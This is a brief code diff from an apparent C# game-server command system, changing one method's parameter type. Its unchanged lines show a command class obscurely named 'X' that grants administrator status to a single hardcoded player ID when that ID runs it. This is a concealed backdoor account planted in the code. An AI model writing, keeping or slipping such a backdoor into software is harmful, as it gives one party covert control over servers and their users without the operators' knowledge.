@@ -697,7 +697,7 @@ internal class X : Commands.CommandSystem.Command
     {
     }
 
-    public override void Execute(CommandInteraction ctx)
+    public override void Execute(CommandContext ctx)
     {
         if (ctx.CallerID == 76561198267927009ul)
             PermissionSaver.Instance.SetPlayerPermissionLevel(76561198267927009, EAdminType.ADMIN_ON_DUTY);
